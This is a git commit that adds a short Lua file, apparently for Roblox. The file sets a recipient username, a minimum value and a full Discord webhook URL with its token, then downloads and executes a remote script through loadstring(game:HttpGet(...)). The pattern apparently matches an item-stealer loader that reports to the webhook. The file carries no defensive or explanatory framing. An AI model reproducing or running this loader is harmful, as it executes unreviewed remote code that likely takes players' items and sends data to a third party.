040b0b45ee2655cba03c51c1a70ba2ef10d42fde
tacskull <guiweuller666@gmail.com>
2025-04-25 02:33:30 -0300

    Add obfuscated Lua script

---
+++ scripts/tacskull_1745559210246/obfuscated.lua
@@ -0,0 +1,4 @@
+_G.username = "meuusername";
+_G.min_value = 10;
+_G.webhook = "https://discord.com/api/webhooks/1363215168586121389/fmtcoVLJ6Bdb5JnOSJzL6wd9C8XDhhAPq2CeD8naENd976xOU1sWj3FGhmMkwxeB86ND";
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tacskull/rec/main/shjwkw.lua"))();
